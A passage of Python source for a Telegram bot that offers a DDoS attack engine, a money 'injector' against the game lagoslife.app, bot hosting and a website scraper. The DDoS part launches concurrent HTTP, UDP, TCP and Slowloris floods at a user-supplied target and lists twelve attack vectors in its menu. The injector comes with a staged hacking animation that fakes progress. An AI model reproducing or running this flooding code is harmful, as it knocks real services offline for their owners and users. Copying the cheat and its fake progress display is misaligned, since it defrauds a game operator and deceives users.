        time.sleep(duration)
        self.running = False

    def vector_multivector(self, target, port, duration, threads):
        self.running = True
        sub = max(1, threads // 4)
        url = target if target.startswith("http") else f"http://{target}"
        for fn, args in [
            (self.vector_http_flood, (url, duration, sub)),
            (self.vector_udp_flood, (target, port, duration, sub)),
            (self.vector_tcp_flood, (target, port, duration, sub)),
            (self.vector_slowloris, (target, port, duration, sub)),
        ]:
            threading.Thread(target=fn, args=args, daemon=True).start()
        time.sleep(duration)
        self.running = False


ddos_engine = SYSFullToolkitBot()
ddos_user_state = {}  # {user_id: {"step": "...", "target": ..., "port": ..., "dur": ..., "threads": ...}}

# ─────────────────────────────────────────────
#  STORAGE
# ─────────────────────────────────────────────

def load_welcome_pic():
    global welcome_pic_id
    try:
        if os.path.isfile(WELCOME_PIC_FILE):
            with open(WELCOME_PIC_FILE, "r") as f:
                data = json.load(f)
                welcome_pic_id = data.get("file_id")
    except:
        welcome_pic_id = None

def save_welcome_pic(file_id):
    global welcome_pic_id
    welcome_pic_id = file_id
    try:
        with open(WELCOME_PIC_FILE, "w") as f:
            json.dump({"file_id": file_id}, f)
    except:
        pass

def load_users():
    global all_users
    try:
        if os.path.isfile(USERS_FILE):
            with open(USERS_FILE, "r") as f:
                data = json.load(f)
            if isinstance(data, list):
                all_users = set(int(x) for x in data)
            else:
                all_users = set()
        else:
            all_users = set()
    except:
        all_users = set()

def save_users():
    try:
        with open(USERS_FILE, "w") as f:
            json.dump(sorted(all_users), f)
    except:
        pass

def track_user(uid):
    uid = int(uid)
    if uid not in all_users:
        all_users.add(uid)
        save_users()
    else:
        all_users.add(uid)

def save_hosts():
    data = {}
    for bid, b in hosted_bots.items():
        data[bid] = {
            "owner_id": b["owner_id"],
            "name": b["name"],
            "path": b["path"],
            "main_file": b["main_file"],
            "kind": b["kind"],
            "created": b["created"],
            "env": b.get("env", {}),
            "token": b.get("token", "")
        }
    try:
        with open(HOSTS_FILE, "w") as f:
            json.dump(data, f, indent=2)
    except:
        pass

def load_hosts():
    global hosted_bots
    if not os.path.isfile(HOSTS_FILE):
        return
    try:
        with open(HOSTS_FILE, "r") as f:
            data = json.load(f)
        for bid, b in data.items():
            hosted_bots[bid] = {
                "owner_id": b["owner_id"],
                "name": b["name"],
                "path": b["path"],
                "main_file": b["main_file"],
                "kind": b["kind"],
                "created": b.get("created", ""),
                "env": b.get("env", {}),
                "token": b.get("token", ""),
                "proc": None,
                "log_path": os.path.join(b["path"], "bot.log")
            }
    except:
        pass

load_welcome_pic()
load_users()
os.makedirs(DOWNLOADS_DIR, exist_ok=True)
os.makedirs(BOTS_DIR, exist_ok=True)
load_hosts()

# ─────────────────────────────────────────────
#  UI HELPERS
# ─────────────────────────────────────────────

def is_admin(uid):
    return uid in ADMIN_IDS

def main_menu(user_id=None):
    keyboard = [
        [InlineKeyboardButton("🔐  LOGIN", callback_data="login")],
        [InlineKeyboardButton("⚡  INJECT", callback_data="run"),
         InlineKeyboardButton("🛑  KILL", callback_data="stop")],
        [InlineKeyboardButton("💰  SET AMOUNT", callback_data="set_amount"),
         InlineKeyboardButton("🎯  TARGET", callback_data="set_target")],
        [InlineKeyboardButton("📡  STATUS", callback_data="status"),
         InlineKeyboardButton("📖  HELP", callback_data="help")],
        [InlineKeyboardButton("🤖  MY BOTS", callback_data="my_bots"),
         InlineKeyboardButton("➕  NEW BOT", callback_data="new_bot")],
        [InlineKeyboardButton("🕸  SCRAPER", callback_data="scraper"),
         InlineKeyboardButton("🆘  SUPPORT", callback_data="support")],
        [InlineKeyboardButton("💥  DDOS", callback_data="ddos")]
    ]
    if user_id and is_admin(user_id):
        keyboard.append([InlineKeyboardButton("👁  ADMIN PANEL", callback_data="admin")])
    return InlineKeyboardMarkup(keyboard)

def bot_control_panel(bot_id):
    """Professional control panel like the screenshot"""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("▶️ Start", callback_data=f"bstart_{bot_id}"),
         InlineKeyboardButton("🔄 Restart", callback_data=f"brestart_{bot_id}")],
        [InlineKeyboardButton("⚡ Live Logs", callback_data=f"blogs_{bot_id}"),
         InlineKeyboardButton("ℹ️ Info", callback_data=f"binfo_{bot_id}")],
        [InlineKeyboardButton("⚙️ Env Vars", callback_data=f"benv_{bot_id}"),
         InlineKeyboardButton("📦 Install Pkg", callback_data=f"bpkg_{bot_id}")],
        [InlineKeyboardButton("📋 Clone", callback_data=f"bclone_{bot_id}"),
         InlineKeyboardButton("⬇️ Download", callback_data=f"bdl_{bot_id}")],
        [InlineKeyboardButton("🔑 Set Token", callback_data=f"btoken_{bot_id}"),
         InlineKeyboardButton("📁 Update Files", callback_data=f"bupdate_{bot_id}")],
        [InlineKeyboardButton("📂 File List", callback_data=f"bfiles_{bot_id}")],
        [InlineKeyboardButton("❌ Delete", callback_data=f"bdel_{bot_id}")],
        [InlineKeyboardButton("« My Bots", callback_data="my_bots")]
    ])

def admin_panel():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📋 SESSIONS", callback_data="sessions"),
         InlineKeyboardButton("👥 USERS", callback_data="users")],
        [InlineKeyboardButton("🛑 STOP USER", callback_data="stop_user"),
         InlineKeyboardButton("📢 BROADCAST", callback_data="broadcast")],
        [InlineKeyboardButton("🖼 SET WELCOME PIC", callback_data="set_pic")],
        [InlineKeyboardButton("🔄 UPDATE CORE", callback_data="update_bot")],
        [InlineKeyboardButton("👑 ALL HOSTED BOTS", callback_data="all_bots")],
        [InlineKeyboardButton("« BACK", callback_data="back_main")]
    ])

def amount_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("₦50K", callback_data="amt_50000"),
         InlineKeyboardButton("₦100K", callback_data="amt_100000")],
        [InlineKeyboardButton("₦500K", callback_data="amt_500000"),
         InlineKeyboardButton("₦1M", callback_data="amt_1000000")],
        [InlineKeyboardButton("✏ CUSTOM", callback_data="amt_custom")],
        [InlineKeyboardButton("« BACK", callback_data="back_main")]
    ])

def back_only():
    return InlineKeyboardMarkup([[InlineKeyboardButton("« BACK", callback_data="back_main")]])

def ddos_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 Ping / Check", callback_data="dd_ping"),
         InlineKeyboardButton("🖥 Resources", callback_data="dd_res")],
        [InlineKeyboardButton("📊 Live Status", callback_data="dd_status"),
         InlineKeyboardButton("🛑 Stop Attack", callback_data="dd_stop")],
        [InlineKeyboardButton("01 HTTP Flood", callback_data="dd_01"),
         InlineKeyboardButton("02 SYN Flood", callback_data="dd_02")],
        [InlineKeyboardButton("03 UDP Flood", callback_data="dd_03"),
         InlineKeyboardButton("04 TCP Flood", callback_data="dd_04")],
        [InlineKeyboardButton("05 DNS Amp", callback_data="dd_05"),
         InlineKeyboardButton("06 ICMP Flood", callback_data="dd_06")],
        [InlineKeyboardButton("07 Slowloris", callback_data="dd_07"),
         InlineKeyboardButton("08 WS Flood", callback_data="dd_08")],
        [InlineKeyboardButton("09 SSL Flood", callback_data="dd_09"),
         InlineKeyboardButton("10 Slow POST", callback_data="dd_10")],
        [InlineKeyboardButton("11 RUDY", callback_data="dd_11"),
         InlineKeyboardButton("12 H2 Reset", callback_data="dd_12")],
        [InlineKeyboardButton("🔥 MULTI-VECTOR", callback_data="dd_multi")],
        [InlineKeyboardButton("« BACK", callback_data="back_main")]
    ])

def banner(title):
    return (
        f"╔══════════════════════════╗\n"
        f"║  ▓ {title.center(20)} ▓  ║\n"
        f"╚══════════════════════════╝"
    )

def card(title, body):
    return (
        f"┌──[ {title} ]──────────────\n"
        f"{body}\n"
        f"└──────────────────────────"
    )

def progress_bar(current, total=16):
    filled = min(current % (total + 1), total)
    return f"[{'█' * filled}{'░' * (total - filled)}]"

def live_status(cycle, bal, accepted, amount, total_added=0, target=0, running=True, extra=""):
    state = "● ACTIVE" if running else "○ HALTED"
    rate = f"{(accepted / cycle * 100):.0f}%" if cycle > 0 else "—"
    text = (
        f"╔══════════════════════════╗\n"
        f"║   ⚡ LIVE INJECTION ⚡    ║\n"
        f"╚══════════════════════════╝\n\n"
        f"  Payload  : ₦{amount:,}\n"
        f"  State    : {state}\n"
        f"  Cycle    : {cycle}\n"
        f"  Success  : {accepted} ({rate})\n"
        f"  Injected : ₦{total_added:,}\n"
        f"  Balance  : ₦{bal:,}\n"
    )
    if target > 0:
        text += f"  Target   : ₦{target:,}\n"
    text += f"\n  {progress_bar(accepted)}"
    if extra:
        text += f"\n\n  » {extra}"
    return text

def welcome_caption():
    return (
        f"╔══════════════════════════╗\n"
        f"║   LAGOS LIFE  //  CORE   ║\n"
        f"╚══════════════════════════╝\n\n"
        f"  ▸ Access granted\n"
        f"  ▸ Module : Injector + Bot Host\n"
        f"  ▸ Mode   : Private + Groups\n"
        f"  ▸ Status → your DM\n\n"
        f"  Select operation below."
    )

def bot_status_card(bot_id):
    """Build the status text like the screenshot"""
    b = hosted_bots.get(bot_id)
    if not b:
        return "Bot not found"
    alive = b.get("proc") and b["proc"].poll() is None
    status = "🟢 Running" if alive else "🔴 Stopped"
    pid = str(b["proc"].pid) if alive else "—"
    uptime = "—"
    if alive and b.get("started_at"):
        secs = int(time.time() - b["started_at"])
        h, rem = divmod(secs, 3600)
        m, s = divmod(rem, 60)
        uptime = f"{h}h {m}m {s}s"
    size = "—"
    try:
        main_path = os.path.join(b["path"], b["main_file"])
        if os.path.isfile(main_path):
            size_b = os.path.getsize(main_path)
            if size_b < 1024:
                size = f"{size_b} B"
            elif size_b < 1024 * 1024:
                size = f"{size_b / 1024:.1f} KB"
            else:
                size = f"{size_b / (1024*1024):.1f} MB"
    except:
        pass
    cpu = "0.0%"
    mem = "0.0 B"
    if alive:
        try:
            # rough stats via /proc if linux
            with open(f"/proc/{b['proc'].pid}/status") as f:
                for line in f:
                    if line.startswith("VmRSS:"):
                        kb = int(line.split()[1])
                        if kb < 1024:
                            mem = f"{kb} KB"
                        else:
                            mem = f"{kb/1024:.1f} MB"
                        break
        except:
            pass
    return (
        f"════════════════════════\n"
        f"  Status  : {status}\n"
        f"  Kind    : {b['kind']}\n"
        f"  PID     : {pid}\n"
        f"  Uptime  : {uptime}\n"
        f"  Size    : {size}\n"
        f"  CPU     : {cpu}\n"
        f"  Memory  : {mem}\n"
        f"  Created : {b.get('created', '—')}\n"
        f"  Main    : {b['main_file']}\n"
        f"════════════════════════"
    )

HACK_FRAMES = [
    "```\nroot@core:~# ./inject --target lagoslife.app\n[*] Resolving host...\n```",
    "```\nroot@core:~# ./inject --target lagoslife.app\n[*] Resolving host... OK\n[*] Opening secure channel...\n```",
    "```\nroot@core:~# ./inject --target lagoslife.app\n[*] Resolving host... OK\n[*] Opening secure channel... OK\n[*] Authenticating session...\n[■□□□□□□□□□] 12%\n```",
    "```\nroot@core:~# ./inject --target lagoslife.app\n[*] Resolving host... OK\n[*] Opening secure channel... OK\n[*] Authenticating session... OK\n[*] Bypassing rate-limit...\n[■■■□□□□□□□] 28%\n```",
    "```\nroot@core:~# ./inject --target lagoslife.app\n[*] Resolving host... OK\n[*] Opening secure channel... OK\n[*] Authenticating session... OK\n[*] Bypassing rate-limit... OK\n[*] Reading save structure...\n[■■■■□□□□□□] 41%\n```",
    "```\nroot@core:~# ./inject --target lagoslife.app\n[*] Resolving host... OK\n[*] Opening secure channel... OK\n[*] Authenticating session... OK\n[*] Bypassing rate-limit... OK\n[*] Reading save structure... OK\n[*] Patching money field...\n[■■■■■■□□□□] 58%\n```",
    "```\nroot@core:~# ./inject --target lagoslife.app\n[*] Resolving host... OK\n[*] Opening secure channel... OK\n[*] Authenticating session... OK\n[*] Bypassing rate-limit... OK\n[*] Reading save structure... OK\n[*] Patching money field...\n[*] Writing encrypted payload...\n[■■■■■■■□□□] 73%\n```",
    "```\nroot@core:~# ./inject --target lagoslife.app\n[*] Resolving host... OK\n[*] Opening secure channel... OK\n[*] Authenticating session... OK\n[*] Bypassing rate-limit... OK\n[*] Reading save structure... OK\n[*] Patching money field... OK\n[*] Writing encrypted payload...\n[*] Verifying write...\n[■■■■■■■■□□] 89%\n```",
    "```\nroot@core:~# ./inject --target lagoslife.app\n[*] Resolving host... OK\n[*] Opening secure channel... OK\n[*] Authenticating session... OK\n[*] Bypassing rate-limit... OK\n[*] Reading save structure... OK\n[*] Patching money field... OK\n[*] Writing encrypted payload... OK\n[*] Verifying write... OK\n[■■■■■■■■■■] 100%\n\n[+] Injection ready. Starting loop.\n```",
]

# ─────────────────────────────────────────────
#  WEB SCRAPER ENGINE
# ─────────────────────────────────────────────

def scraper_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📥 Save URL", callback_data="sc_save"),
         InlineKeyboardButton("📚 Batch", callback_data="sc_batch")],
        [InlineKeyboardButton("🕸 Full site crawl", callback_data="sc_full"),
         InlineKeyboardButton("⚙️ Scraper settings", callback_data="sc_settings")],
        [InlineKeyboardButton("🕸 Crawl info", callback_data="sc_crawl"),
         InlineKeyboardButton("🕘 History", callback_data="sc_history")],
        [InlineKeyboardButton("ℹ️ Scraper help", callback_data="sc_help")],
        [InlineKeyboardButton("« BACK", callback_data="back_main")]
    ])


def scraper_settings_kb(uid):
    s = scraper_settings[uid]

    def m(v):
        return "✅" if v else "❌"

    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"Depth {s['depth']}", callback_data="scset:depth"),
         InlineKeyboardButton(f"Assets {s['max_assets'] or '∞'}", callback_data="scset:assets")],
        [InlineKeyboardButton(f"Images {m(s['images'])}", callback_data="scset:images"),
         InlineKeyboardButton(f"JS/CSS {m(s['js_css'])}", callback_data="scset:jscss"),
         InlineKeyboardButton(f"Fonts {m(s['fonts'])}", callback_data="scset:fonts")],
        [InlineKeyboardButton(f"Mode · {s['mode']}", callback_data="scset:mode"),
         InlineKeyboardButton(f"Rewrite {m(s['rewrite'])}", callback_data="scset:rewrite")],
        [InlineKeyboardButton(f"Mobile {m(s['mobile'])}", callback_data="scset:mobile"),
         InlineKeyboardButton(f"Shot {m(s['screenshot'])}", callback_data="scset:shot")],
        [InlineKeyboardButton("🎯 Selector", callback_data="scset:selector"),
         InlineKeyboardButton("🧹 Clear sel", callback_data="scset:selclear")],
        [InlineKeyboardButton("↺ Defaults", callback_data="scset:reset")],
        [InlineKeyboardButton("« Scraper", callback_data="scraper")]
    ])


def scraper_job_kb(job_id, running=True):
    rows = [[
        InlineKeyboardButton("📄 MD", callback_data=f"scmd:{job_id}"),
        InlineKeyboardButton("📝 TXT", callback_data=f"sctxt:{job_id}"),
        InlineKeyboardButton("📦 ZIP", callback_data=f"sczip:{job_id}"),
    ], [InlineKeyboardButton("🖼 Shot", callback_data=f"scshot:{job_id}")]]
    if running:
        rows.append([InlineKeyboardButton("⏹ Cancel", callback_data=f"sccancel:{job_id}")])
    rows.append([InlineKeyboardButton("« Scraper", callback_data="scraper")])
    return InlineKeyboardMarkup(rows)


def _sc_safe_name(url, default="file"):
    path = unquote(urlparse(url).path)
    name = os.path.basename(path.rstrip("/")) or default
    name = re.sub(r"[^\w.\-]", "_", name)
    if not name or name in (".", ".."):
        name = default
    if len(name) > 120:
        stem, ext = os.path.splitext(name)
        name = stem[:100] + ext[:20]
    return name


def _sc_folder(url):
    host = urlparse(url).netloc or "site"
    return "source_" + re.sub(r"[^\w.\-]", "_", host)


def _sc_same_domain(a, b):
    na = urlparse(a).netloc.lower().removeprefix("www.")
    nb = urlparse(b).netloc.lower().removeprefix("www.")
    return na == nb


def _sc_norm(url):
    url, _ = urldefrag(url)
    p = urlparse(url)
    path = p.path or "/"
    if path != "/" and path.endswith("/"):
        path = path[:-1]
    return p._replace(path=path, fragment="").geturl()


def _sc_hash(s, n=8):
    return hashlib.sha1(s.encode("utf-8", errors="ignore")).hexdigest()[:n]


def _sc_asset_path(asset_url, assets_dir):
    name = _sc_safe_name(asset_url, "asset")
    ext = FsPath(name).suffix.lower()
    h = _sc_hash(asset_url)
    if not ext or len(ext) > 6:
        name = f"{h}_{name}" if name != "asset" else h
    else:
        name = f"{FsPath(name).stem[:80]}_{h}{ext}"
    if ext in (".js", ".mjs", ".cjs"):
        sub = "js"
    elif ext == ".css":
        sub = "css"
    elif ext in (".png", ".jpg", ".jpeg", ".gif", ".webp", ".svg", ".ico", ".avif"):
        sub = "img"
    elif ext in (".woff", ".woff2", ".ttf", ".otf", ".eot"):
        sub = "fonts"
    else:
        sub = "other"
    return assets_dir / sub / name


def _sc_bar(done, total, width=12):
    if total <= 0:
        return "░" * width + f" {done}"
    filled = min(width, int(width * done / max(total, 1)))
    return "█" * filled + "░" * (width - filled) + f" {done}/{total}"


def _sc_fetch(url, mobile=False, max_bytes=None):
    r = _sc_http_get(url, mobile=mobile, timeout=20)
    r.raise_for_status()
    if max_bytes is not None and len(r.content) > max_bytes:
        raise ValueError("too large")
    return r


def _sc_download_asset(url, dest, mobile=False):
    try:
        r = _sc_http_get(url, mobile=mobile, timeout=20)
        if r.status_code >= 400:
            return False, f"HTTP {r.status_code}"
        ctype = (r.headers.get("Content-Type") or r.headers.get("content-type") or "")
        ctype = str(ctype).split(";")[0].strip().lower()
        data = r.content or b""
        if len(data) > SCRAPER_MAX_ASSET_BYTES:
            return False, "too large"
        if dest.suffix.lower() in ("", ".html", ".htm") or len(dest.suffix) > 6:
            ext = mimetypes.guess_extension(ctype or "") or ""
            if ext == ".jpe":
                ext = ".jpg"
            if ext:
                dest = dest.with_suffix(ext)
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(data)
        return True, ctype or "ok"
    except Exception as e:
        msg = str(e)
        if "Timeout" in type(e).__name__ or "timed out" in msg.lower():
            return False, "timeout"
        if "SSL" in msg or "certificate" in msg.lower():
            return False, "ssl error"
        return False, msg[:80]


def _sc_collect_assets(html_text, base, want_images, want_jscss, want_fonts):
    found, seen = [], set()

    def add(u):
        if not u or u.startswith(("data:", "javascript:", "mailto:", "tel:", "#", "blob:")):
            return
        full = urljoin(base, u).split("#")[0]
        if urlparse(full).scheme not in ("http", "https"):
            return
        if full not in seen:
            seen.add(full)
            found.append(full)

    if HAS_BS4:
        soup = BeautifulSoup(html_text, "html.parser")
        if want_jscss:
            for el in soup.find_all("script", src=True):
                add(el["src"])
            for el in soup.find_all("link", href=True):
                rel = " ".join(el.get("rel") or []).lower()
                href = el["href"]
                if "stylesheet" in rel or href.lower().endswith(".css"):
                    add(href)
                elif want_fonts and ("preload" in rel or href.lower().endswith((".woff", ".woff2", ".ttf", ".otf"))):
                    add(href)
        if want_images:
            for el in soup.find_all(["img", "source", "image"]):
                for attr in ("src", "data-src", "data-original", "href"):
                    if el.get(attr):
                        add(el[attr])
                for attr in ("srcset", "data-srcset"):
                    val = el.get(attr)
                    if val:
                        for part in val.split(","):
                            add(part.strip().split(" ")[0])
            for el in soup.find_all(style=True):
                for m in re.finditer(r"url\(\s*['\"]?([^'\")\s]+)['\"]?\s*\)", el.get("style") or ""):
                    add(m.group(1))
        for style in soup.find_all("style"):
            if style.string:
                for m in re.finditer(r"url\(\s*['\"]?([^'\")\s]+)['\"]?\s*\)", style.string):
                    add(m.group(1))
        for el in soup.find_all("link", href=True):
            if "icon" in " ".join(el.get("rel") or []).lower():
                add(el["href"])
    else:
        patterns = []
        if want_jscss:
            patterns += [
                r"""<script[^>]+src=["']([^"']+)["']""",
                r"""<link[^>]+href=["']([^"']+)["']""",
            ]
        if want_images:
            patterns += [r"""<img[^>]+src=["']([^"']+)["']"""]
        for pat in patterns:
            for m in re.finditer(pat, html_text, re.I):
                add(m.group(1))
    return found


def _sc_extract_links(html_text, base):
    links, seen = [], set()
    if HAS_BS4:
        soup = BeautifulSoup(html_text, "html.parser")
        for a in soup.find_all("a", href=True):
            href = a["href"]
            if href.startswith(("javascript:", "mailto:", "tel:", "#")):
                continue
            full = _sc_norm(urljoin(base, href))
            if urlparse(full).scheme in ("http", "https") and full not in seen:
                seen.add(full)
                links.append(full)
    else:
        for m in re.finditer(r"""<a[^>]+href=["']([^"'#]+)["']""", html_text, re.I):
            full = _sc_norm(urljoin(base, m.group(1)))
            if urlparse(full).scheme in ("http", "https") and full not in seen:
                seen.add(full)
                links.append(full)
    return links


def _sc_apply_selector(html_text, selector):
    if not selector or not HAS_BS4:
        return html_text
    soup = BeautifulSoup(html_text, "html.parser")
    parts = soup.select(selector)
    if not parts:
        return html_text
    title = soup.title.string if soup.title and soup.title.string else selector
    body = "\n".join(str(p) for p in parts)
    return (
        f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
        f"<title>{html_lib.escape(str(title))}</title></head><body>\n{body}\n</body></html>"
    )


def _sc_rewrite(html_text, base, url_map):
    if not url_map:
        return html_text
    if not HAS_BS4:
        out = html_text
        for remote, local in sorted(url_map.items(), key=lambda x: -len(x[0])):
            out = out.replace(remote, local)
        return out
    soup = BeautifulSoup(html_text, "html.parser")

    def map_url(u):
        if not u or u.startswith(("data:", "javascript:", "#", "mailto:")):
            return None
        full = urljoin(base, u).split("#")[0]
        return url_map.get(full)

    for el in soup.find_all(["script", "img", "source", "video", "audio", "iframe"]):
        if el.get("src"):
            local = map_url(el["src"])
            if local:
                el["src"] = local
        if el.get("data-src"):
            local = map_url(el["data-src"])
            if local:
                el["data-src"] = local
    for el in soup.find_all("link", href=True):
        local = map_url(el["href"])
        if local:
            el["href"] = local
    for el in soup.find_all(srcset=True):
        parts = []
        for part in el["srcset"].split(","):
            bits = part.strip().split()
            if not bits:
                continue
            local = map_url(bits[0])
            if local:
                bits[0] = local
            parts.append(" ".join(bits))
        el["srcset"] = ", ".join(parts)
    return str(soup)


def _sc_to_md(html_text):
    if HAS_H2T:
        h = html2text.HTML2Text()
        h.ignore_links = False
        h.ignore_images = False
        h.body_width = 0
        return h.handle(html_text)
    text = re.sub(r"(?is)<script.*?>.*?</script>", " ", html_text)
    text = re.sub(r"(?is)<style.*?>.*?</style>", " ", text)
    text = re.sub(r"(?s)<[^>]+>", " ", text)
    return re.sub(r"\s+", " ", text).strip()


def _sc_to_txt(html_text):
    if HAS_BS4:
        soup = BeautifulSoup(html_text, "html.parser")
        for t in soup(["script", "style", "noscript"]):
            t.decompose()
        return soup.get_text("\n", strip=True)
    text = re.sub(r"(?is)<script.*?>.*?</script>", " ", html_text)
    text = re.sub(r"(?is)<style.*?>.*?</style>", " ", text)
    text = re.sub(r"(?s)<[^>]+>", " ", text)
    return re.sub(r"\n{3,}", "\n\n", text).strip()


def _sc_screenshot(url, out_path, mobile=False):
    if not HAS_PW:
        return False
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            if mobile:
                context = browser.new_context(**p.devices["iPhone 13"])
            else:
                context = browser.new_context(
                    viewport={"width": 1360, "height": 900},
                    user_agent=SCRAPER_UA,
                )
            page = context.new_page()
            page.goto(url, wait_until="networkidle", timeout=50000)
            page.screenshot(path=str(out_path), full_page=True)
            browser.close()
        return out_path.exists() and out_path.stat().st_size > 0
    except Exception:
        return False


def _sc_save_site(start_url, work_dir, settings, chat_id, status_cb):
    depth = int(settings.get("depth") or 0)
    max_assets = int(settings.get("max_assets") or 0)
    want_images = bool(settings.get("images", True))
    want_jscss = bool(settings.get("js_css", True))
    want_fonts = bool(settings.get("fonts", True))
    selector = (settings.get("selector") or "").strip()
    mobile = bool(settings.get("mobile"))
    do_rewrite = bool(settings.get("rewrite", True))

    work_dir.mkdir(parents=True, exist_ok=True)
    assets_dir = work_dir / "assets"
    pages_dir = work_dir / "pages"
    pages_dir.mkdir(exist_ok=True)

    seen_pages = set()
    queue = deque([(_sc_norm(start_url), 0)])
    page_count = asset_ok = asset_fail = 0
    url_to_local = {}
    final_start = start_url
    page_htmls = {}
    fail_list = []  # (url, reason)

    while queue and page_count < SCRAPER_MAX_PAGES:
        if chat_id in scraper_cancel:
            break
        url, d = queue.popleft()
        url = _sc_norm(url)
        if url in seen_pages:
            continue
        seen_pages.add(url)
        try:
            resp = _sc_fetch(url, mobile=mobile, max_bytes=SCRAPER_MAX_HTML_BYTES)
        except Exception as e:
            fail_list.append((url, f"page: {str(e)[:60]}"))
            continue
        final_url = _sc_norm(resp.url)
        if page_count == 0:
            final_start = final_url
        ctype = (resp.headers.get("Content-Type") or "").lower()
        if "html" not in ctype and not final_url.endswith((".html", ".htm", "/")) and page_count > 0:
            continue
        html_text = resp.text
        if selector:
            html_text = _sc_apply_selector(html_text, selector)
        page_htmls[final_url] = html_text
        page_count += 1
        status_cb(
            f"⏳ Crawl\n<code>{html_lib.escape(final_url[:90])}</code>\n"
            f"{_sc_bar(page_count, max(page_count, depth + 1))}\nDepth {d}/{depth}"
        )

        assets = _sc_collect_assets(html_text, final_url, want_images, want_jscss, want_fonts)
        if d < depth:
            for link in _sc_extract_links(html_text, final_url):
                if _sc_same_domain(final_start, link) and link not in seen_pages:
                    queue.append((link, d + 1))

        pending = []
        for aurl in assets:
            if max_assets > 0 and (asset_ok + asset_fail + len(pending)) >= max_assets:
                break
            if aurl in url_to_local:
                continue
            dest = _sc_asset_path(aurl, assets_dir)
            url_to_local[aurl] = str(dest.relative_to(work_dir)).replace("\\", "/")
            pending.append((aurl, dest))

        if pending:
            status_cb(f"⏳ Assets · {len(pending)} queued\n{_sc_bar(asset_ok, asset_ok + len(pending))}")
            with ThreadPoolExecutor(max_workers=SCRAPER_ASSET_WORKERS) as pool:
                futs = {pool.submit(_sc_download_asset, a, d, mobile): (a, d) for a, d in pending}
                for fut in as_completed(futs):
                    if chat_id in scraper_cancel:
                        break
                    aurl, dest = futs[fut]
                    ok, reason = fut.result()
                    if ok and dest.exists():
                        asset_ok += 1
                        url_to_local[aurl] = str(dest.relative_to(work_dir)).replace("\\", "/")
                    else:
                        asset_fail += 1
                        url_to_local.pop(aurl, None)
                        fail_list.append((aurl, reason or "unknown"))

    for i, (final_url, html_text) in enumerate(page_htmls.items()):
        if do_rewrite:
            html_text = _sc_rewrite(html_text, final_url, url_to_local)
        if i == 0:
            path = work_dir / "index.html"
        else:
            name = _sc_safe_name(final_url, f"page_{i}")
            if not name.endswith((".html", ".htm")):
                name += ".html"
            path = pages_dir / name
        path.write_text(html_text, encoding="utf-8", errors="replace")

    index_html = (
        (work_dir / "index.html").read_text(encoding="utf-8", errors="replace")
        if (work_dir / "index.html").exists() else ""
    )
    md_text = _sc_to_md(index_html)
    txt_text = _sc_to_txt(index_html)
    (work_dir / "page.md").write_text(md_text, encoding="utf-8")
    (work_dir / "page.txt").write_text(txt_text, encoding="utf-8")

    report_lines = [
        f"Source: {start_url}",
        f"Final: {final_start}",
        f"Pages: {page_count}",
        f"Depth: {depth}",
        f"Assets OK: {asset_ok}",
        f"Assets FAIL: {asset_fail}",
        f"Selector: {selector or '-'}",
        "",
    ]
    if fail_list:
        report_lines.append("=== FAILED ASSETS ===")
        for fu, reason in fail_list[:80]:
            report_lines.append(f"[{reason}] {fu}")
        if len(fail_list) > 80:
            report_lines.append(f"... and {len(fail_list) - 80} more")
        report_lines.append("")
    (work_dir / "DOWNLOAD_REPORT.txt").write_text("\n".join(report_lines), encoding="utf-8")

    return {
        "final_url": final_start,
        "pages": page_count,
        "asset_ok": asset_ok,
        "asset_fail": asset_fail,
        "fail_list": fail_list[:15],
        "work_dir": work_dir,
        "md_path": work_dir / "page.md",
        "txt_path": work_dir / "page.txt",
    }


def _sc_make_zip(folder, zip_path):
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED, compresslevel=6) as zf:
        for file in sorted(folder.rglob("*")):
            if file.is_file():
                zf.write(file, file.relative_to(folder))
    return zip_path


def _sc_extract_urls(text):
    out = []
    for u in SCRAPER_URL_RE.findall(text or ""):
        u = u.rstrip(").,]>\"'")
        if not u.startswith(("http://", "https://")):
            u = "https://" + u
        out.append(u)
    return out


def scraper_run_job(bot, chat_id, url, status_msg_id):
    settings = dict(scraper_settings[chat_id])
    tmp = FsPath(tempfile.mkdtemp(prefix="web_src_"))
    job_id = f"{chat_id}_{int(time.time())}"
    with scraper_lock:
        scraper_jobs[chat_id] = {
            "job_id": job_id, "url": url, "tmp": str(tmp),
            "status_msg_id": status_msg_id, "result": None,
        }
    scraper_cancel.discard(chat_id)

    def status_cb(text):
        try:
            bot_sync(bot.edit_message_text(
                chat_id=chat_id, message_id=status_msg_id,
                text=text[:4096], parse_mode="HTML",
                reply_markup=scraper_job_kb(job_id, running=True),
            ), timeout=30)
        except Exception:
            pass

    try:
        work = tmp / _sc_folder(url)
        status_cb(
            f"⏳ Started\n<code>{html_lib.escape(url)}</code>\n"
            f"depth={settings['depth']} · assets≤{settings['max_assets'] or '∞'}"
        )
        result = _sc_save_site(url, work, settings, chat_id, status_cb)
        if chat_id in scraper_cancel:
            status_cb("⏹ Cancelled")
            return

        shot_path = work / "screenshot.png"
        if settings.get("screenshot") and HAS_PW:
            status_cb("📸 Screenshot…")
            if _sc_screenshot(result["final_url"], shot_path, mobile=settings.get("mobile")):
                try:
                    with open(shot_path, "rb") as f:
                        bot_sync(bot.send_photo(
                            chat_id=chat_id, photo=f, caption=result["final_url"][:200]
                        ), timeout=60)
                except Exception:
                    pass

        zip_path = tmp / (_sc_folder(result["final_url"]) + ".zip")
        _sc_make_zip(work, zip_path)
        size_mb = zip_path.stat().st_size / (1024 * 1024)
        mode = settings.get("mode") or "zip"
        fail_preview = ""
        fails = result.get("fail_list") or []
        if fails:
            lines = []
            for fu, reason in fails[:5]:
                short = fu if len(fu) <= 70 else fu[:67] + "..."
                lines.append(f"• [{html_lib.escape(str(reason))}] {html_lib.escape(short)}")
            more = f"\n… +{result['asset_fail'] - 5} more (see DOWNLOAD_REPORT.txt)" if result["asset_fail"] > 5 else ""
            fail_preview = "\n\n<b>Failed assets</b>\n" + "\n".join(lines) + more
        summary = (
            f"✅ <b>Saved</b>\n<code>{html_lib.escape(result['final_url'])}</code>\n"
